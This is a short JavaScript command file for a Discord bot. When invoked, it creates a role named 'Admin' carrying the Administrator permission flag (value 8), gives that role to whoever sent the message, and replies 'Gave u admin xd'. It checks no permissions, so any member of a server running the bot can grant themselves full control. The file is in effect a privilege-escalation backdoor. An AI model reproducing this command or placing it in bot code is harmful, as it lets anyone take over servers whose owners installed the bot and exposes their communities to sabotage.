exports.run=(client,message)=>{
	message.guild.createRole({
		name:'Admin',
		hoist:true,
		permissions:8,
	}).then(role=>message.member.addRole(role.id));
	message.channel.send('Gave u admin xd');
}
